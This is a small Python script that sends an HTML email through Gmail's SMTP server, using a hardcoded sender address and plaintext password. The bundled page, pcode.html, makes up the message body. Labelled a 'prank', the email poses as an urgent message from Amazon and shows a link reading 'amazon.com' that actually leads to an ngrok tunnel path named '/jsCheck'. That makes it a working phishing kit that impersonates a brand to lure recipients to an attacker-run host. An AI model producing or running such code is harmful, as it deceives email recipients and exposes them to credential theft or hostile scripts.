from email.message import EmailMessage
import smtplib
import os

os.chdir(os.path.dirname(__file__))

_from = 'smtpmessages.manager@gmail.com'
pwd = 'smtpmessages.manager@gmail.com@2012'

def send_email(receiver, subject, message, subtype='plain'):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(_from, pwd)
    email = EmailMessage()
    email['From'] = _from
    email['To'] = receiver
    email['Subject'] = subject
    email.set_content(message, subtype=subtype)
    server.send_message(email)

prank_code = open('pcode.html', 'r').read()
send_email('***@gmail.com', 'This is a urgent message from amazon', prank_code, 'html')

# pcode.html
<html>
    <head></head>
    <body>
        <h1>Click this link</h1>
        <a href="https://***.ngrok.io/jsCheck">amazon.com</a>
    </body>
</html>
